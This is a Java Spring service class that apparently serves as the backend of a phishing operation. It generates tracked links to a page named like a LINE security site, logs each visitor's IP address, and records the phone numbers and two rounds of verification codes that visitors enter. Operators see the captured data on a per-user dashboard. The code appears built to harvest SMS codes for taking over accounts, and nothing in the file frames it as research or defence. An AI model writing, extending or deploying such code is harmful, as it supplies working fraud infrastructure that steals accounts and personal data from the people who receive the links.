package org.jeecg.modules.code.service.impl;

import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;
import com.baomidou.mybatisplus.core.metadata.IPage;
import com.baomidou.mybatisplus.extension.plugins.pagination.Page;
import com.baomidou.mybatisplus.extension.service.impl.ServiceImpl;
import lombok.extern.slf4j.Slf4j;
import org.apache.commons.lang.StringUtils;
import org.jeecg.common.api.vo.Result;
import org.jeecg.common.system.util.JwtUtil;
import org.jeecg.common.util.TokenUtils;
import org.jeecg.modules.code.entity.CodeEntity;
import org.jeecg.modules.code.entity.request.CodeListRequest;
import org.jeecg.modules.code.mapper.CodeMapper;
import org.jeecg.modules.code.service.ICodeService;
import org.jeecg.modules.message.util.RandomStringGenerator;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.redis.core.RedisTemplate;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import javax.servlet.http.HttpServletRequest;
import java.time.LocalDateTime;
import java.util.Optional;

/**
 * @author K
 */
@Service
@Slf4j
public class CodeServiceImpl extends ServiceImpl<CodeMapper, CodeEntity> implements ICodeService {

    @Autowired
    private RedisTemplate redisTemplate;


    @Override
    @Transactional
    public Result<Boolean> loadPage(String remoteAddr,String code) {
        log.info("load page from ip:{}",remoteAddr);
        if (!checkUrlCode(code)){
            return Result.error("url expire");
        }
        CodeEntity getRecord = this.baseMapper.getByFlag(remoteAddr,code);
        if (getRecord!=null && getRecord.getExpireTime().isBefore(LocalDateTime.now())){
         return Result.error("flag expire");
        }else if (getRecord!=null){
            this.baseMapper.updateTime(getRecord.getCodeId());
        }
        if (getRecord==null || getRecord.getFinished()==1){
            createFlag(remoteAddr,this.baseMapper.count(remoteAddr,code),code);
        }
        return Result.ok(true);
    }

    private boolean checkUrlCode(String code) {
        Integer effect = this.baseMapper.checkUrlCode(code);
        return effect!=null;
    }

    private synchronized void createFlag(String remoteAddr, Integer count, String code) {
        synchronized (CodeServiceImpl.class) {
            Integer customerNum = this.baseMapper.existsFlag(remoteAddr);
            String bindUser = this.baseMapper.getCodeBindUser(code);
            if (customerNum==null){
                customerNum = Optional.ofNullable(this.baseMapper.customerCount(remoteAddr)).orElse(0) +1;
            }
            this.baseMapper.createFlag(remoteAddr,count,code,customerNum,bindUser);
        }
    }



    @Override
    public Result list(CodeListRequest request) {
        QueryWrapper<CodeEntity> queryWrapper = new QueryWrapper<>();
        // 获取当前请求的属性
        ServletRequestAttributes attributes = (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();
        String userName = null;
        if (attributes != null) {
            HttpServletRequest servletRequest = attributes.getRequest();
            userName = JwtUtil.getUserNameByToken(servletRequest);
        }
        if (!JwtUtil.isAdmin(userName)){
            queryWrapper.eq("bind_user",userName);
        }
        queryWrapper.lambda().eq(request.getCodeStatus()!=null,CodeEntity::getCodeStatus,request.getCodeStatus());
        queryWrapper.lambda().eq(request.getPhone()!=null,CodeEntity::getPhone,request.getPhone());
        queryWrapper.orderByDesc("update_time");
        Page<CodeEntity> page = new Page<CodeEntity>(request.getPageNo(), request.getPageSize());
        IPage<CodeEntity> pageList = this.page(page, queryWrapper);
        Result<IPage<CodeEntity>> result = new Result<>();
        result.setSuccess(true);
        result.setResult(pageList);
        return result;
    }

    @Override
    public Result<Boolean> updateField(String remoteAddr, String code, String phone, String validateCode, String phone2, String validateCode2, String action) {
        CodeEntity getRecord = this.baseMapper.getByFlag(remoteAddr,code);
        if (StringUtils.isNotBlank(phone)){
            this.baseMapper.updatePhone(remoteAddr,code,phone);
            if (action.equals("submit")){
                this.baseMapper.updateCodeStatus(getRecord.getCodeId(),1);
            }
        }
        if (StringUtils.isNotBlank(phone2)){
            this.baseMapper.updatePhone2(remoteAddr,code,phone2);
            if (action.equals("submit")){
                this.baseMapper.updateCodeStatus(getRecord.getCodeId(),3);
            }
        }
        if (StringUtils.isNotBlank(validateCode)){
            this.baseMapper.updateValidateCode(remoteAddr,code,validateCode);
            if (action.equals("submit")){
                this.baseMapper.updateCodeStatus(getRecord.getCodeId(),2);
            }
        }
        if (StringUtils.isNotBlank(validateCode2)){
            this.baseMapper.updateValidateCode2(remoteAddr,code,validateCode2);
            if (action.equals("submit")){
                this.baseMapper.updateCodeStatus(getRecord.getCodeId(),4);
                this.baseMapper.finish(getRecord.getCodeId());
            }
        }
        this.baseMapper.updateTime(getRecord.getCodeId());
        return Result.ok(true);
    }

    @Override
    public Result createUrl() {
        String username = JwtUtil.getUsername(TokenUtils.getTokenByRequest());
        String code = RandomStringGenerator.generateRandomString();
        this.baseMapper.createUrl(username, code);
        return Result.ok("https://lineanquan.com/index.html?code="+code);
    }

}
